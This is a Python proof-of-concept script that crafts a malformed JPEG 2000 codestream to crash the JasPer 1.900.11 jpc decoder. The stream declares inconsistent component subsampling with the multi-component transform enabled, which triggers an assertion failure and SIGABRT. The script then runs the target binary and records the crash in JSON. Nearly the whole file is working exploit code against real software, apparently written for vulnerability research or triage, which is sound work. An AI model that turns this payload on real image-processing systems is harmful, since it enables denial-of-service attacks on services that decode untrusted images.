#!/usr/bin/env python3
"""PoC: crash JasPer 1.900.11 jpc decoder via inconsistent component
subsampling combined with the multi-component transform (MCT/ICT).

The generated JPEG 2000 codestream declares 3 components where component 0
is subsampled (XRsiz=2) while the COD marker enables the multi-component
transform. During tile decoding, jpc_mct.c's jpc_irct() asserts that all
three component matrices have identical dimensions, which fails, killing
the process with SIGABRT.

Usage:
    python3 poc.py --binary /path/to/jasper [--json-out out.json] [--timeout SEC]
"""

import argparse
import json
import os
import signal
import struct
import subprocess
import sys
import tempfile
import time

MAX_STREAM_CHARS = 10000


def build_payload():
    """Construct the malformed JPEG 2000 raw codestream in memory."""
    out = bytearray()

    # SOC
    out += b"\xff\x4f"

    # SIZ: 16x16 image, one 16x16 tile at origin, 3 components.
    # Component 0 is (maliciously) subsampled by 2 in X; components 1 and 2
    # are not subsampled. The decoder accepts this, but the inverse
    # multi-component transform later trips on the dimension mismatch.
    comps = [(7, 2, 1), (7, 1, 1), (7, 1, 1)]  # (Ssiz, XRsiz, YRsiz)
    siz_body = struct.pack(">H", 0)                      # Rsiz
    siz_body += struct.pack(">IIII", 16, 16, 0, 0)       # Xsiz Ysiz XOsiz YOsiz
    siz_body += struct.pack(">IIII", 16, 16, 0, 0)       # XTsiz YTsiz XTOsiz YTOsiz
    siz_body += struct.pack(">H", len(comps))            # Csiz
    for ssiz, xrsiz, yrsiz in comps:
        siz_body += struct.pack(">BBB", ssiz, xrsiz, yrsiz)
    out += b"\xff\x51" + struct.pack(">H", 2 + len(siz_body)) + siz_body

    # COM: registration 1 (Latin), creator string (mirrors jasper output).
    com_body = struct.pack(">H", 1) + b"Creator: JasPer Version 1.900.11"
    out += b"\xff\x64" + struct.pack(">H", 2 + len(com_body)) + com_body

    # COD: LRCP, 1 layer, MCT enabled (this is the key trigger), 5 levels,
    # 64x64 code blocks, 5/3 reversible wavelet.
    cod_body = struct.pack(
        ">BBHBBBBBB",
        0,  # Scod
        0,  # progression order: LRCP
        1,  # number of layers
        1,  # multiple component transform: enabled (RCT)
        5,  # decomposition levels
        4,  # code-block width exponent (2^(4+2)=64)
        4,  # code-block height exponent
        0,  # code-block style
        1,  # transform: 5/3 reversible
    )
    out += b"\xff\x52" + struct.pack(">H", 2 + len(cod_body)) + cod_body

    # QCD: reversible (no quantization), 5x3, guard bits 2.
    qcd_body = bytes.fromhex("40 40 48 48 50 48 48 50 48 48 50 48 48 50 48 48 50")
    out += b"\xff\x5c" + struct.pack(">H", 2 + len(qcd_body)) + qcd_body

    # QCC for components 1 and 2 (main header).
    for compno in (1, 2):
        qcc_body = bytes([compno]) + bytes.fromhex(
            "40 40 48 48 50 48 48 50 48 48 50 48 48 50 48 48 50"
        )
        out += b"\xff\x5d" + struct.pack(">H", 2 + len(qcc_body)) + qcc_body

    # Tile part: SOT + per-component QCCs + SOD + packet data + EOC.
    tile = bytearray()
    for compno in (0, 1, 2):
        qcc_body = bytes([compno]) + bytes.fromhex(
            "40 40 00 00 00 48 48 50 48 48 50 48 48 50 48 48 50"
        )
        tile += b"\xff\x5d" + struct.pack(">H", 2 + len(qcc_body)) + qcc_body
    tile += b"\xff\x93"          # SOD
    tile += b"\x80" * 18         # (empty) packet data

    # Psot covers the SOT segment through the end of the tile data
    # (the trailing EOC marker is not included).
    psot = 12 + len(tile)        # SOT segment is 12 bytes
    tile += b"\xff\xd9"          # EOC
    sot = b"\xff\x90" + struct.pack(">HHI BB".replace(" ", ""), 10, 0, psot, 0, 1)
    out += sot + tile

    return bytes(out)


def truncate(text, limit=MAX_STREAM_CHARS):
    if len(text) > limit:
        return text[:limit] + "...<truncated>"
    return text


def pick_evidence(stderr_text):
    """Pick the most relevant stderr lines (assertion/sanitizer/error)."""
    if not stderr_text:
        return ""
    keys = ("Assertion", "AddressSanitizer", "ERROR:", "runtime error:",
            "Segmentation", "abort", "error:")
    lines = [ln for ln in stderr_text.splitlines() if ln.strip()]
    for key in keys:
        for ln in lines:
            if key in ln:
                return truncate(ln, 2000)
    return truncate(lines[-1], 2000) if lines else ""


def main():
    parser = argparse.ArgumentParser(
        description="PoC trigger generator for the jasper jpc decoder")
    parser.add_argument("--binary", required=True, help="path to target binary")
    parser.add_argument("--json-out", default=None, help="write JSON result here")
    parser.add_argument("--timeout", type=float, default=300.0,
                        help="process timeout in seconds (default 300)")
    args = parser.parse_args()

    result = {
        "binary": args.binary,
        "command": None,
        "returncode": None,
        "signal": None,
        "timed_out": False,
        "runtime_ms": 0,
        "stdout": "",
        "stderr": "",
        "observable": {"kind": "stderr", "value": "", "path": None},
        "error": None,
    }

    tmp_path = None
    try:
        payload = build_payload()
        fd, tmp_path = tempfile.mkstemp(suffix=".jpc", prefix="poc_")
        with os.fdopen(fd, "wb") as fh:
            fh.write(payload)

        cmd = [args.binary, "-f", tmp_path, "-t", "jpc",
               "-F", "/dev/null", "-T", "pnm"]
        result["command"] = cmd

        start = time.monotonic()
        try:
            proc = subprocess.run(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                timeout=args.timeout,
            )
            result["runtime_ms"] = int((time.monotonic() - start) * 1000)
            result["returncode"] = proc.returncode
            if proc.returncode is not None and proc.returncode < 0:
                sig_num = -proc.returncode
                try:
                    result["signal"] = signal.Signals(sig_num).name
                except ValueError:
                    result["signal"] = "SIG%d" % sig_num
            result["stdout"] = truncate(proc.stdout.decode("utf-8", "replace"))
            result["stderr"] = truncate(proc.stderr.decode("utf-8", "replace"))
        except subprocess.TimeoutExpired as exc:
            result["runtime_ms"] = int((time.monotonic() - start) * 1000)
            result["timed_out"] = True
            if exc.stdout:
                result["stdout"] = truncate(
                    exc.stdout.decode("utf-8", "replace")
                    if isinstance(exc.stdout, bytes) else exc.stdout)
            if exc.stderr:
                result["stderr"] = truncate(
                    exc.stderr.decode("utf-8", "replace")
                    if isinstance(exc.stderr, bytes) else exc.stderr)

        result["observable"]["value"] = pick_evidence(result["stderr"])
    except Exception as exc:  # noqa: BLE001 - report any failure in JSON
        result["error"] = "%s: %s" % (type(exc).__name__, exc)
    finally:
        if tmp_path:
            try:
                os.unlink(tmp_path)
            except OSError:
                pass

    text = json.dumps(result, indent=2)
    if args.json_out:
        with open(args.json_out, "w") as fh:
            fh.write(text + "\n")
    print(text)

    return 0 if result["error"] is None else 1


if __name__ == "__main__":
    sys.exit(main())
